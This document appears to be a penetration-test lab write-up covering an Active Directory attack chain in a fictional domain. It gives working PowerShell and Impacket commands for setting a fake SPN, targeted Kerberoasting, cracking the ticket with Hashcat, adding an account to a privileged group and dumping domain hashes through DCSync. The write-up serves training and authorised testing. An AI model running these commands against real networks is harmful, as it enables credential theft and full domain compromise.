## Active Directory Compromise

We recovered `mssqladm:DBAilfreight1!` and found `GenericWrite` over `ttimmons`. That let us set a fake SPN on `ttimmons`, request a Kerberos service ticket, crack it, and then use the new credentials to add `ttimmons` to `SERVER ADMINS`, which granted DCSync rights.

## Creating a Credential Object

We went back to `DEV01` where PowerView was already loaded. We created a `PSCredential` object so we could act as `mssqladm` without logging in again.

```powershell
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
```

## Setting the Fake SPN

We used `Set-DomainObject` to add a fake SPN to `ttimmons`.

```powershell
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```

This SPN was temporary and would be removed later and documented in the report appendices. The goal was to make `ttimmons` return a Kerberos service ticket that could be cracked offline.

## Targeted Kerberoasting

From the attack host, we requested a ticket for `ttimmons` with `GetUserSPNs.py`.

```bash
proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
```

The command returned a TGS hash for `ttimmons`. We then used Hashcat against `rockyou.txt` to crack it.

```bash
hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
```

The crack succeeded, giving another valid password for `ttimmons`. That meant the account was weak enough to be used for further abuse.

## Group Enumeration

We checked BloodHound again and found that `ttimmons` had `GenericAll` over the `SERVER ADMINS` group. BloodHound also showed that `SERVER ADMINS` had the ability to perform DCSync and retrieve NTLM password hashes for domain users.

This meant we could add `ttimmons` to that group and inherit the DCSync rights.

## Building New Credentials

We created another `PSCredential` object, this time for `ttimmons`.

```powershell
$timpass = ConvertTo-SecureString '<PASSWORD REDACTED>' -AsPlainText -Force
$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
```

Then we resolved the group name to its SID and added `ttimmons` to `Server Admins`.

```powershell
$group = Convert-NameToSid "Server Admins"
Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
```

## DCSync Attack

After adding the account to the group, we used `secretsdump.py` to DCSync NTLM hashes from the domain controller.

```bash
proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
```

The output showed multiple domain hashes, including `Administrator`, `Guest`, `krbtgt`, and several domain users. At this point, the path to domain compromise was open.

## Useful Follow-Up

The text recommends documenting every step carefully. It also recommends dumping the full NTDS database and cracking it offline to assess password strength and overall account hygiene.

It also suggests proving access in a way the client can easily understand. A useful report screenshot would show a domain controller session with the output of these commands:

```powershell
hostname
whoami
ipconfig /all
```

## Additional Value

After Domain Admin access, the text suggests more testing where in scope. That includes checking trust relationships, exploring other AD paths, and testing whether the client detects changes to highly privileged groups such as Domain Admins and Enterprise Admins.

If accounts are added to privileged groups during testing, the change should be documented in the report appendices. The client should also get credit if they detect and remove the changes quickly.
